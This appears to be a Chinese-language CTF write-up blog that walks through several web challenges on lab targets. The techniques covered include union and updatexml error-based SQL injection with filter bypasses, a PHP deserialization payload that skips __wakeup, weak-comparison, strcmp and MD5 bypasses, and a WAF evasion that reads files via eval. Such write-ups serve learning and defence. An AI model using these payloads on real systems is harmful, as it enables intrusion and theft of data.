<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> frorom infoorrmation_schema.tables wherore table_schema=&#x27;geek&#x27;#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654cc3f0c458853aef7cce63.jpg"><br><code>6、爆列</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> frorom infoorrmation_schema.columns wherore table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654cc400c458853aef7cfe4a.jpg"><br><code>7、直接爆flag</code></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; unioorn seleorct <span class="number">1</span>,group<span class="constructor">_concat(<span class="params">username</span>)</span>,group<span class="constructor">_concat(<span class="params">passwoorrd</span>)</span> frorom b4bsql# </span><br></pre></td></tr></table></figure>
<p>查看源码获取flag<br><img src="https://pic.imgdb.cn/item/654cc40ec458853aef7d26ba.jpg"><br><code>learn by ashash</code></p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开靶机,发现网站正上方提示,猜测存在网站备份文件,毫不犹豫进行目录扫描。<br><code>但是：</code>御剑以及kali上的dirb、nikto好像都扫不出来。<br>这里运用了另一款目录扫描工具:dirsearch。<br>安装以及使用:<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/128305168">https://blog.csdn.net/whatday/article/details/128305168</a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http:<span class="regexp">//</span>target -e php -t <span class="number">40</span></span><br></pre></td></tr></table></figure>
<p>扫描过程中发现了疑似flag的文件:flag.php。<br><img src="https://pic.imgdb.cn/item/654da188c458853aefe61ef0.jpg"><br>细看才发现大小为0B…..额好家伙。<br>接着扫描,发现了网站备份文件:<a target="_blank" rel="noopener" href="http://www.zip,下载下来便可以代码审计了./">www.zip,下载下来便可以代码审计了。</a><br><img src="https://pic.imgdb.cn/item/654da194c458853aefe63ba4.jpg"><br><code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显,骗人的。<br><code>index.php</code><br>关键是:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">  <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>应该是这里接收序列化的内容然后传输给class.php。那么关键flag相关的应该就是class.php了。<br><code>class.php</code><br>关键代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>重点代码解读:</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">Private</span> 是一种可见性修饰符，<span class="keyword">private</span>与<span class="keyword">public</span>不同，<span class="keyword">private</span>修饰的方法和数据域被限定只能在自己的类中被访问，即使在同一个包中也不能被其它类访问，<span class="keyword">public</span>则可以运用在类或者类的成员上。</span><br><span class="line"><span class="keyword">private</span>：用于声明私有变量(序列化后会多<span class="number">%00</span>)	<span class="keyword">public</span>：用于声明全局变量</span><br><span class="line"><span class="number">2</span>、__construct()<span class="comment">//构造函数,创建对象时调用</span></span><br><span class="line"><span class="number">3</span>、__destruct()<span class="comment">//对象被销毁时以及调用 serialize () 触发</span></span><br><span class="line"><span class="number">4</span>、__wakeup () <span class="comment">// 调用 unserialize (),即反序列化前触发</span></span><br></pre></td></tr></table></figure>
<p>那么就可以构造PHP代码生成payload。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span>=<span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意将显示不出来的符号换成%00。<br>payload：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>但输入后却不可以获取flag,思考后,发现是class.php的__wakeup()在反序列化前调用了,那么username就被换成了guest。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php：</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以目前需要绕过wakeup()。那么怎么绕过呢？<br><code>如果对象属性的个数的值大于真实的属性个数的时候会绕过__wakeup的执行,把对象属性的值(这里是Name)即2改为大于2的数字就可以实现绕过</code><br>优化后的payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>键入网址栏即可获取flag。<br><img src="https://pic.imgdb.cn/item/654da19cc458853aefe64d2a.jpg"><br><code>1、我发现根据对方网站的代码构造生成payload的代码时,对方网站的代码中若含有方法,我们而已不理这些方法,直接构造一个只含有属性值的类</code><br><code>2、注意各种魔术方法在什么时候被调用,从而可以实现绕过一些干扰我们的魔术方法。还有就是注意private与public</code></p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>这道题很莫名其妙就输出了flag,很懵逼。<br>题目名字叫做backupfile,中文备份文件嘛,直接目录扫描先。<br>扫到一个index.php.bak,打开代码审计。<br>方便起见,我直接在注释里面里写。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once <span class="string">&quot;flag.php&quot;</span>;<span class="regexp">//</span>证明满足一定条件会输出flag.php的内容</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;<span class="regexp">//</span>以属性key接收用户键入的值</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];<span class="regexp">//</span>赋值给<span class="variable">$key</span></span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;<span class="regexp">//</span>检查变量是否为数值。如果为数值返回真；反之返回假。</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);<span class="regexp">//</span>这里只允许输入纯数字</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);<span class="regexp">//</span>将输入的值强制转为整数</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;<span class="regexp">//</span><span class="variable">$key</span>与<span class="variable">$str</span>相等时才输出flag</span><br><span class="line">        echo <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>几个函数的作用</code><br>1、is_numeric():检查变量是否为数值。如果为数值返回真；反之返回假。<br>2、intval():PHP中常用的一个强制类型转换函数，用于将变量的值转换为整数。<br>这里有点懵,我刚开始是将$str的值直接复制下来赋值给$key的,但是存在验证,获取flag失败。<br>但是后面我就想:如果输入纯数字会怎么样,那我就直接把123后面的那一串删掉了，没想到直接爆出flag。<br><code>这里我上网查阅了资料才理解</code><br><code>原来：</code> &#x3D;&#x3D; 是一个弱比较（高版本php弱比较没了）<br>&#x3D;&#x3D;&#x3D;(强比较) 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。(类型不相等直接不比较值)<br>&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较。(把类型转为相等再比较)<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。<br>所以这里str &#x3D; “123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”在和数字比较时，str就转换称了123<br>所以str&#x3D;&#x3D;flag。这里intval()也发挥了重要作用，将$key取整变成int型</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>开启靶机,是一个简易的网站页面，先看源码吧。<br>存在一个”pay.php”，估计是关键的物件，点进去看一下。<br>依然是个普通的界面，继续查看源码，这一看不要紧，看到关键解题信息<br><img src="https://pic.imgdb.cn/item/654de30ac458853aef9f89fc.jpg"><br>这段代码估计是pay.php的源码，这里泄露了。<br>意思是以属性password接收，之后强制转换为数字，如果&#x3D;404可能会输出flag。<br>这里直接抓包,把get提交方式改为post,加上password。<br><img src="https://pic.imgdb.cn/item/654de328c458853aef9fe219.jpg"><br>但是发现还是没有用户权限，那就尝试把cookie值的0改为1(<code>做题多了自然会知道--迪师傅</code>)<br>成功连上用户，但是发现数据没有传送成功。<br><img src="https://pic.imgdb.cn/item/654de336c458853aefa00c74.jpg"><br><code>这里因为前面是get，你直接修改方法为post但还是缺少必要数据</code><br>加上</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</span><br></pre></td></tr></table></figure>
<p>接着发包，成功传送，但是发现不可为纯数字，突然想到不必传送纯数字，因为后面的intval()会把我们输入的password强制转为整数哈哈。<br><img src="https://pic.imgdb.cn/item/654de37fc458853aefa0ea13.jpg"><br>成功登录，但发现好像需要我们给钱。那就给他！<br><img src="https://pic.imgdb.cn/item/654de3a0c458853aefa14928.jpg"><br>发现数字过长，那就改短点？<br><img src="https://pic.imgdb.cn/item/654de3a0c458853aefa14928.jpg"><br>tnnd，戏耍我？上网寻求大佬的帮助，发现这里应该是使用strcmp()函数比较字符串的<br><code>那我把字符串改为数组，然后输入任意价格不就行了？</code><br>我直接0元购，bug到flag。<br><img src="https://pic.imgdb.cn/item/654de3d9c458853aefa1ecd8.jpg"><br><code>总结</code><br>1、数据包提交方式由get-&gt;post：首先把头部的get改为post，然后加上Content-Type: application&#x2F;x-www-form-urlencoded，在数据包的最后加上你要发送的数据。<br>2、flag不是一遍就可以得出来的，要敢于利用对方网站代码的漏洞进行尝试。</p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><code>这道题是报错盲注</code><br>开启靶机，依然是登录框。<br>密码随意填，用户名填1|1’测试是字符型还是数字型。<br>这里填1’的时候报错，证明是字符型。<br><img src="https://pic.imgdb.cn/item/65597718c458853aef66db02.jpg"><br>这里常规测试：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
<p>发现存在字符被过滤。<br>初步猜测是对空格字符存在过滤，应该是空格后不能有数据。<br>常规的联合注入不适用（这里也用了sqlmap跑了一下，map说测试不出注入点hh）<br>那么可以采用报错盲注的方式。</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><code>updatexml()</code><br>首先先测试updatexml函数可不可用。</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p>爆数据库名字<br><img src="https://pic.imgdb.cn/item/6559772bc458853aef67117f.jpg"><br>成功爆出，那么这个思路可以继续使用。<br>爆数据库版本</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,version()),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597733c458853aef6728b5.jpg"><br>爆表</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">group_concat</span>(<span class="name">table_name</span>))from(<span class="name">information_schema</span>.tables)where(<span class="name">table_schema</span>)like(<span class="name">database</span>()))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6559774cc458853aef677495.jpg"><br>爆字段</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">group_concat</span>(<span class="name">column_name</span>))from(<span class="name">information_schema</span>.columns)where(<span class="name">table_name</span>)like(&#x27;H4rDsq1&#x27;))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597760c458853aef67b331.jpg"><br><code>爆flag</code></p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">group_concat</span>(<span class="name">password</span>))from(<span class="name">H4rDsq1</span>))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p>成功爆出flag，但是很奇怪，只有一半（输出限制）。<br>那么先爆左边</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">left</span>(<span class="name">password</span>,<span class="number">30</span>))from(<span class="name">H4rDsq1</span>))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597771c458853aef67e5f9.jpg"><br>再爆右边</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">right</span>(<span class="name">password</span>,<span class="number">30</span>))from(<span class="name">H4rDsq1</span>))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597780c458853aef6816bb.jpg"><br><code>注意：这里的右半部分可能会包括左半部分，看清楚再拼接</code><br>这样即可获取flag。</p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><code>1、开启靶机，是一个简单的文本输入框，这里我先一顿乱输入，发现一点反应都没有，查看源代码也没有可以利用地方，那么就尝试抓包。</code><br>发现与题目搭边的md5关键字<br><img src="https://pic.imgdb.cn/item/6561630ec458853aef80f8e3.jpg"><br><code>2、那么这里首先了解一下md5函数的意义。</code><br>md5(string,raw)<br>参数以及描述<br>string 必需。要计算的字符串。<br>raw 可选。<br>默认不写为FALSE，32位16进制的字符串<br>TRUE，16位原始二进制格式的字符串<br> 32位16进制字符串的意思是：将MD5加密得到的128 位长度的”指纹信息”，以每4位为一组，分为32组，每组以转换为16进制，进行转换得到一个32位的字符串。<br>总的来说就是我们平时看到的MD5加密的结果<br>16位原始二进制格式的字符串的意思是：将MD5加密得到的128 位长度的”指纹信息”分组转化为16位的一个字符串，然后两个字符为一组，依照ACILL码转化为字符串。<br><code>可以这样理解：raw为true时，相当于在raw值为false时，再进行一次计算</code><br><code>3、我们的目标就是要找一个字符串取32位16进制的md5值里带有276f7227这个字段的</code><br><code>为什么有这个思路？</code><br>因为首先看到函数的raw字段值为true，所以就是把md5加密后再输出成一个8位16进制，而前几位是276f7227，276f7227经过这道题目的函数处理后，会还原成’or’,相当于是万能密码了。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73560599/article/details/131998887">https://blog.csdn.net/weixin_73560599/article/details/131998887</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rammstein-and-rock/p/16513692.html">https://www.cnblogs.com/Rammstein-and-rock/p/16513692.html</a><br>借助其他师傅，发现了符合条件的字符串：ffifdyop，做md5后：276f722736c95d99e921722cf9ed621c，然后就会实现绕过。<br><code>4、在框内输入ffifdyop</code><br>成功跳转到另一个界面<br><img src="https://pic.imgdb.cn/item/6561631dc458853aef812152.jpg"><br>查看源码<br><img src="https://pic.imgdb.cn/item/6561632dc458853aef814c31.jpg"><br><code>5、数组绕过</code><br>md5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null<br>比如将两个数组的md5值进行比较<br>md5(a[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b[]&#x3D;1)<br>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样<br>null &#x3D;&#x3D;&#x3D; null<br>结果返回true,也就是说数组的md5值进行比较时,结果相等<br>数组绕过不只可以绕过弱类型比较,还可以绕过强类型比较(&#x3D;&#x3D;&#x3D;)<br>进行数组绕过<br>?a[]&#x3D;1&amp;b[]&#x3D;2,成功跳转<br><img src="https://pic.imgdb.cn/item/65616339c458853aef816e3f.jpg"><br><code>6、同样，只不过是以post传输数据</code><br><img src="https://pic.imgdb.cn/item/6561633cc458853aef81786a.jpg"><br><code>主要是第一步比较难以想出来，涨知识了</code><br>md5相关绕过学习文章<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116779357">https://blog.csdn.net/LYJ20010728/article/details/116779357</a></p>
<h2 id="RoarCTF-2019-Easy-Calc-1"><a href="#RoarCTF-2019-Easy-Calc-1" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>感谢这位师傅的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52116519/article/details/124212036">https://blog.csdn.net/weixin_52116519/article/details/124212036</a><br><code>1、前置知识</code><br>原理1：PHP的字符串解析特性<br>PHP将查询字符串（在URL或正文中）转换为内部$_GET或关联数组$_POST。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。<br>例如：<br>如何实现：&#x2F;?foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。<br>&#x2F;? foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个空格<br>&#x2F;?+foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个+号<br><code>php在解析的时候，会先把空格(+)去掉，然后解析</code><br>原理2：scandir()列出目录和文件,var_dump()用于输出<br>scandir()函数返回指定目录中的文件和目录的数组。<br>scandir(&#x2F;)相当于ls &#x2F;<br>var_dump()相当于echo<br>原理3：file_get_contents()读取并输出文件内容<br>例如 file_get_contents(&#x2F;flag.php)，读取&#x2F;flag.php的代码<br><code>2、分析</code><br>开启靶机，发现是一个计算机的界面，那么就正常计算，发现可以实现；输入其他则无回显。<br>查看源代码，看源码，发现有 waf 和路径<br><img src="https://pic.imgdb.cn/item/65616dd0c458853aefa051e0.jpg"><br>访问这个路径，是一段源代码<br><img src="https://pic.imgdb.cn/item/65616de2c458853aefa082c5.jpg"><br>大概意思是：GET传入一个num，并且对num的值进行黑名单过滤，最后eval()执行。但是测试过后，黑名单过滤的不止源码列出来的。<br>输入字符，直接被waf拦截<br><img src="https://pic.imgdb.cn/item/65616debc458853aefa09aca.jpg"><br>应该是这样：当检测到用户输入数据时，首先时waf进行检测，通过后就是这个网站的后端代码继续正则检测。<br><code>3、斩题</code><br><code>原理一利用</code><br>首先绕过waf对于num属性的监听，利用原理一<br><img src="https://pic.imgdb.cn/item/65616df5c458853aefa0b4cd.jpg"><br>由于waf原先是监听检测”num”，现在换成了” num”，成功绕过waf检测；但是php在解析的时候，会先把空格去掉，然后解析，这样实现绕过兼运行代码。<br><code>原理二利用</code><br>接下来我们尝试读取网站的目录结构</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">//相当于? num=<span class="keyword">system</span>(ls /)。chr(<span class="number">47</span>)=&quot; / &quot;<span class="comment">--ASCLL码值。</span></span><br></pre></td></tr></table></figure>
<p><code>注意：函数内部的具体内容要使用ASCLL码绕过这个网站的后端代码继续正则检测</code><br>发现flag存在的目录<br><img src="https://pic.imgdb.cn/item/65616dffc458853aefa0cbed.jpg"><br><code>原理三的利用</code></p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).<span class="built_in">chr</span>(<span class="number">102</span>).<span class="built_in">chr</span>(<span class="number">49</span>).<span class="built_in">chr</span>(<span class="number">97</span>).<span class="built_in">chr</span>(<span class="number">103</span>).<span class="built_in">chr</span>(<span class="number">103</span>))<span class="comment">//多个字符间不可使用空格，会被正则匹配到，所以换成.连接</span></span><br></pre></td></tr></table></figure>
<p><code>4、成功获取到flag</code><br><img src="https://pic.imgdb.cn/item/65616e0fc458853aefa0f9c8.jpg"><br><code>学习连接</code><br>利用PHP的字符串解析特性Bypass：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
